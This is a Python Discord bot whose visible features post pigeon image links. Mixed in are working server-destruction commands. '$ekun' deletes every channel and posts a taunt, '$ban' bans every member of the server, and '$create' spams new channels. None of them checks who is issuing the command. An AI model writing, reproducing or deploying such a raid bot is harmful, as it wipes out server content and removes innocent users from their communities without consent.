from logging import log
import discord
from discord import message
from discord import channel
from discord import user
from discord.ext import commands
from discord.ext.commands.bot import when_mentioned
from flask import Flask, render_template, request
import requests, json
import datetime
import requests
from bs4 import BeautifulSoup
import asyncio 
n = 5 
intents = discord.Intents.default()
intents.members = True  # Subscribe to member events
intents = discord.Intents.default()
intents.members = True  # Subscribe to member events
intents.message_content = True  # Subscribe to message content events

bot = commands.Bot(command_prefix='/', intents=intents)
bot = commands.Bot(command_prefix='/', intents=intents)
youtube_api_key = 'YOUR_YOUTUBE_API_KEY_HERE'
youtube_api_service_name = 'youtube'
youtube_api_version = 'v3'



@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} (ID: {bot.user.id})')


@bot.event
async def on_message(message):
    if message.content == '$ekun':
 
            guild = message.guild
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(f'Deleted channel: {channel.name}')
                except Exception as e:
                    print(f'Failed to delete channel {channel.name}: {e}')
            await guild.create_text_channel(name="boom")
            await asyncio.sleep(2)
            for channel in message.guild.text_channels:
                await channel.send("I WIN U LOST")
    elif message.content == '$pigeon':
        await message.channel.send('https://th.bing.com/th/id/R.ffcf1023c37db1f4cee1967e0dade93a?rik=uM7RUNuU2hnslg&riu=http%3a%2f%2fwww.publicdomainpictures.net%2fpictures%2f40000%2fvelka%2fpigeon-1364561001yVr.jpg&ehk=EAOHTc3UAoh4PX0LJfBP%2fp9Tny%2fkNWtQ93Qe8FeV5gM%3d&risl=&pid=ImgRaw&r=0')
    elif message.content == '$pigeon1':
        await message.channel.send('https://www.meigspointnaturecenter.org/wp-content/uploads/2020/08/common-pigeon-ss-scaled.jpg')
    elif message.content == '$pigeon2':
        await message.channel.send('https://cdn.pixabay.com/photo/2020/02/27/13/21/rock-dove-4884627_1280.jpg')
    elif message.content == '$pigeon3':
        await message.channel.send('https://th.bing.com/th/id/OIP.qzcGi-Xx05ijJM2nLKrPdQHaE7?rs=1&pid=ImgDetMain')
    elif message.content == '$pigeonai':
        await message.channel.send('https://thumbs.dreamstime.com/z/d-render-blue-pigeon-neon-lights-background-generative-ai-d-render-blue-pigeon-neon-lights-291048572.jpg')
    elif message.content == '$pigeongng':
        await message.channel.send('https://th.bing.com/th/id/R.b8bcb460b8f9c3e79ef15eef74c08a96?rik=ZuR7S3gNQA5%2bqQ&riu=http%3a%2f%2fth02.deviantart.net%2ffs71%2fPRE%2fi%2f2013%2f058%2fa%2fa%2fcool_pigeon_by_radical_yuris-d5weoam.png&ehk=CLS0KPliRVgwoTMF3L%2bCSzD8qZT%2f1KOSQNXJGUYaxDc%3d&risl=&pid=ImgRaw&r=0')
    elif message.content == '$pigeonrainbow':
        await message.channel.send('https://img.freepik.com/premium-photo/beautiful-looking-great-parrot-bird-pigeon-bird-wallpaper-picture_925414-205.jpg')
    elif message.content == '$pigeonrainbow1':
        await message.channel.send('https://th.bing.com/th/id/OIP.ObL-SRZWrfeuOjfgBmLskgHaGh?rs=1&pid=ImgDetMain')
    elif message.content == '$pigeongng1':
        await message.channel.send('https://i.pinimg.com/originals/52/5d/44/525d44a38032ecf180984922623fa9bb.jpg')
    elif message.content == '$pigeonsrsly': 
        await message.channel.send('https://th.bing.com/th/id/OIP.4yxF4QQf3nxseIgvt9bajAHaGP?rs=1&pid=ImgDetMain')
    elif message.content == '$pigeonrare':
        await message.channel.send('https://i.pinimg.com/736x/bc/92/4f/bc924fbfd2421b8554b910d79b6fdd7b--giraffes-bears.jpg')
                        
    elif message.content == '$create':

        for i in range(10):
            try:
                await message.guild.create_text_channel(f'chat-{i + 1}')
                print(f'Created channel: chat-{i + 1}')
                await asyncio.sleep(1)
            except discord.errors.HTTPException as e:
                    print(f'Failed to create channel: {e}')

    elif message.content == "$ban":
        # Fetch all members in the guild
        members = message.guild.members

        # Make a list of users to ban (excluding bots)
        users_to_ban = [member for member in members ]

        for member in users_to_ban:
            try:
                await asyncio.sleep(11)
                await member.ban()
                print(f'Banned {member.name}')
                await asyncio.sleep(11)
            except discord.Forbidden:
                print(f'Failed to ban {member.name}: Forbidden')
            except discord.HTTPException:
                print(f'Failed to ban {member.name}: HTTP Exception')


    

        await message.channel.send(f'Banned {len(users_to_ban)} members.')
    elif message.content == "$hello":
        await message.channel.send("Hello!")


bot.run("bot token here")
